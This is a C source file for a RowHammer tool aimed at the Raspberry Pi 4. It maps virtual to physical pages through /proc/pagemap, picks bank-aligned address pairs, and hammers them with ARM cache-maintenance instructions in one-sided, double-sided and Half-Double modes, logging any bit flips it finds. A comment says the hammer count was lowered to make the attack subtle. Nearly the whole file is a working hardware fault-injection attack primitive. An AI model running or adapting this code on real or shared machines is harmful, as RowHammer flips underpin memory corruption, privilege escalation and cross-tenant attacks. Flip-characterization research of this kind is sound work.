#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <sys/mman.h>

// --- Configuration ---

// Number of cycles for each pair to hammer
// Tunable: Higher might cause more flips but takes longer.
#define HAMMER_CYCLES 10000  // Reduced to 1/100 to make attack subtle 

// Size of the memory chunk to allocate. 
// 256MB. RPi 4 has plenty of RAM.
#define CHUNK_SIZE (256 * 1024 * 1024) 

// Word Size (RPi 4 is 64-bit)
#define VAL_SIZE sizeof(unsigned long)

// Page size
#define PAGE_SIZE 4096

// Max Virtual Page Number to track. 
// 8GB RAM / 4KB page = ~2 million pages. 
// 0x200000 is 2,097,152 (2GB). We need more for 4GB/8GB models.
// Let's go for 16GB coverage to be safe: 0x400000000 / 4096 = 0x1000000 (16,777,216 pages)
#define VPN_SIZE 0x1000000

// Target Bit for Bank Co-location (Bit 16 -> 64KB stride)
#define TARGET_BIT 16

// --- Structures ---

typedef struct candidate {
  unsigned long pa1;
  unsigned long va1;
  unsigned long pa2;
  unsigned long va2;
  struct candidate *next;
} candidate_t;

// --- Globals ---

// Virtual page map table (Simple array, might be sparse)
// using uint64_t to be safe on 64-bit systems
uint64_t *va_table; 

// The large memory chunk
unsigned long *chunk; 

// --- Function Prototypes ---
void hammer_candidates(candidate_t *head, int mode, int hammer_type, int duration_seconds);
void generate_va_table(int pgmp_fd);
candidate_t * find_candidates(unsigned long addr_bgn, unsigned long addr_end, int target_bit);
void cleanup_candidates(candidate_t *head);
uintptr_t virt_to_phys(int pagemap_fd, uintptr_t vaddr);

// --- Main ---

int main(int argc, char **argv) {
  int pgmp_fd;
  char path[256];
  int mode = 3; // Default to DC ZVA (usually most effective on ARMv8 if available)
  int hammer_type = 2; // Default to Double-sided
  int duration = 60; // Default run time in seconds

  // Argument parsing (Simple)
  if (argc > 1) duration = atoi(argv[1]);
  if (argc > 2) mode = atoi(argv[2]);
  if (argc > 3) hammer_type = atoi(argv[3]);

  printf("[*] RowHammer RPi 4 Tool\n");
  printf("[*] Configuration: Duration=%ds, Mode=%d, Type=%d\n", duration, mode, hammer_type);
  printf("    Modes: 1=DC CVAC, 2=DC CIVAC, 3=DC ZVA\n");
  printf("    Types: 1=One-sided, 2=Double-sided, 3=Half-Double\n");

  // Allocate VA Table
  va_table = (uint64_t *)calloc(VPN_SIZE, sizeof(uint64_t));
  if (!va_table) {
      perror("Failed to allocate va_table");
      return 1;
  }

  // Open Pagemap
  sprintf(path, "/proc/%d/pagemap", getpid());
  pgmp_fd = open(path, O_RDONLY);
  if (pgmp_fd < 0) {
    perror("Unable to open pagemap. Are you running as root?");
    return -1;
  }

  // Allocate Chunk (Aligned to Page Size)
  if (posix_memalign((void **)&chunk, PAGE_SIZE, CHUNK_SIZE) != 0) {
      perror("Failed to allocate memory chunk");
      return -1;
  }
  
  // Initialize with pattern (All 0s or All 1s). 
  // RPi 4 bits often flip 1->0 or 0->1 depending on implementation. 
  // Let's use alternating patterns or just 0xFF. 
  // Here we use 0x00 and check for 1s, or 0xFF and check for 0s.
  // Standard RowHammer often flips 1->0. Let's Init with 0xFF.
  memset(chunk, 0xFF, CHUNK_SIZE);

  printf("[*] Memory allocated at %p, size %d MB\n", chunk, CHUNK_SIZE / (1024*1024));

  // Generate Mappings
  printf("[*] Generating VA->PA mappings...\n");
  generate_va_table(pgmp_fd);

  // Configure Target Bit based on Hammer Type
  // Type 1/2 (Standard): Distance 1 neighbors (stride 64KB -> Bit 16)
  // Type 3 (Half-Double): Distance 2 neighbors (stride 128KB -> Bit 17)
  int current_target_bit = TARGET_BIT;
  if (hammer_type == 3) {
      current_target_bit = TARGET_BIT + 1;
      printf("[*] Half-Double selected: Increasing stride to 128KB (Target Bit %d)\n", current_target_bit);
  }

  // Find Candidates
  printf("[*] Finding candidates (Target Bit %d)...\n", current_target_bit);
  unsigned long bgn = (unsigned long) chunk;
  unsigned long end = bgn + CHUNK_SIZE;
  candidate_t *candidates = find_candidates(bgn, end, current_target_bit);

  if (!candidates) {
      printf("[-] No candidates found. Try a larger chunk size.\n");
      return -1;
  }

  // Count candidates
  int count = 0;
  for (candidate_t *c = candidates; c; c = c->next) count++;
  printf("[+] Found %d candidate pairs.\n", count);

  // Start Hammering
  printf("[*] Starting Hammering (Press Ctrl+C to stop early)...\n");
  printf("RESULT_TYPE,TIMESTAMP,PA,VA_OFFSET,VALUE\n");
  hammer_candidates(candidates, mode, hammer_type, duration);

  // Cleanup
  cleanup_candidates(candidates);
  free(va_table);
  free(chunk);
  close(pgmp_fd);

  return 0;
}

// --- Implementation ---

uintptr_t virt_to_phys(int pagemap_fd, uintptr_t vaddr) {
    uint64_t data;
    uint64_t index = (vaddr / PAGE_SIZE) * sizeof(data);
    if (pread(pagemap_fd, &data, sizeof(data), index) != sizeof(data)) {
        return 0;
    }
    if (!(data & (1ULL << 63))) { // Page present bit
        return 0;
    }
    uint64_t pfn = data & 0x7FFFFFFFFFFFFF;
    return (pfn * PAGE_SIZE) | (vaddr % PAGE_SIZE);
}

void generate_va_table(int pgmp_fd) {
    uintptr_t vaddr_start = (uintptr_t)chunk;
    uintptr_t vaddr_end = vaddr_start + CHUNK_SIZE;
    
    for (uintptr_t va = vaddr_start; va < vaddr_end; va += PAGE_SIZE) {
        uintptr_t pa = virt_to_phys(pgmp_fd, va);
        if (pa != 0) {
            uint64_t pfn = pa / PAGE_SIZE;
            if (pfn < VPN_SIZE) {
                va_table[pfn] = va;
            }
        }
    }
}

candidate_t * find_candidates(unsigned long addr_bgn, unsigned long addr_end, int target_bit) {
    candidate_t *head = NULL;
    uint64_t target_diff = 1ULL << target_bit;

    // We iterate through the chunk looking for PA pairs
    // This is O(N^2) effectively if we scan blindly, but we can use the va_table reverse lookup?
    // Actually, `va_table` maps PFN -> VA. 
    // We want pairs (P1, P2) such that P1 ^ P2 == target_diff.
    
    // Iterate over all valid PFNs in our table
    for (uint64_t pfn = 0; pfn < VPN_SIZE; pfn++) {
        if (va_table[pfn] == 0) continue;

        uintptr_t pa1 = pfn * PAGE_SIZE;
        uintptr_t pa2 = pa1 ^ target_diff; // The pair we want
        uint64_t pfn2 = pa2 / PAGE_SIZE;

        // Check if the pair exists in our allocation
        if (pfn2 < VPN_SIZE && va_table[pfn2] != 0) {
            // Found a pair!
            // To avoid duplicates (A,B) and (B,A), only take if pa1 < pa2
            if (pa1 < pa2) {
                candidate_t *new_cand = (candidate_t *)malloc(sizeof(candidate_t));
                new_cand->pa1 = pa1;
                new_cand->va1 = va_table[pfn];
                new_cand->pa2 = pa2;
                new_cand->va2 = va_table[pfn2];
                new_cand->next = head;
                head = new_cand;
            }
        }
    }
    return head;
}

// --- Helper for Nanoseconds ---
uint64_t get_ns() {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

void hammer_candidates(candidate_t *head, int mode, int hammer_type, int duration_seconds) {
    time_t start_time = time(NULL);
    unsigned long total_flips = 0;
    
    while (time(NULL) - start_time < duration_seconds) {
        candidate_t *curr = head;
        while (curr != NULL) {
            unsigned long a1 = curr->va1;
            unsigned long a2 = curr->va2;
            
            // --- Hammering Primitive ---
            for (int j = 0; j < HAMMER_CYCLES; ++j) {
                if (hammer_type == 2 || hammer_type == 3) {
                    if (mode == 3) {
                         asm volatile("dc zva, %0\n\t" "dc zva, %1\n\t" ::"r" (a1), "r" (a2) : "memory");
                    } else if (mode == 2) {
                        asm volatile("dc civac, %0\n\t" "dc civac, %1\n\t" ::"r" (a1), "r" (a2) : "memory");
                    } else {
                         asm volatile("dc cvac, %0\n\t" "dc cvac, %1\n\t" ::"r" (a1), "r" (a2) : "memory");
                    }
                } else {
                    if (mode == 3) {
                         asm volatile("dc zva, %0\n\t" ::"r" (a1) : "memory");
                    } else if (mode == 2) {
                        asm volatile("dc civac, %0\n\t" ::"r" (a1) : "memory");
                    } else {
                         asm volatile("dc cvac, %0\n\t" ::"r" (a1) : "memory");
                    }
                }
            }

            // --- Check Victim ---
            uintptr_t vctm_pa_base = (curr->pa1 + curr->pa2) / 2;
            uint64_t vctm_pfn = vctm_pa_base / PAGE_SIZE;
            
            if (vctm_pfn < VPN_SIZE && va_table[vctm_pfn] != 0) {
                unsigned long *vctm_va_ptr = (unsigned long *)va_table[vctm_pfn];
                for (int w = 0; w < PAGE_SIZE / VAL_SIZE; w++) {
                    if (vctm_va_ptr[w] != 0xFFFFFFFFFFFFFFFF) {
                        total_flips++;
                        // 나노초 단위 절대 시간 출력
                        printf("FLIP,%lu,%lx,%d,%lx\n", 
                               get_ns(),
                               vctm_pa_base + (w * VAL_SIZE), 
                               w, 
                               vctm_va_ptr[w]);
                        
                        vctm_va_ptr[w] = 0xFFFFFFFFFFFFFFFF;
                    }
                }
            }
            curr = curr->next;
        }
    }
    printf("[*] Finished. Total Flips: %lu\n", total_flips);
    fflush(stdout); // 종료 전 버퍼에 남은 데이터를 확실히 출력
}

void cleanup_candidates(candidate_t *head) {
    candidate_t *tmp;
    while (head) {
        tmp = head;
        head = head->next;
        free(tmp);
    }
}
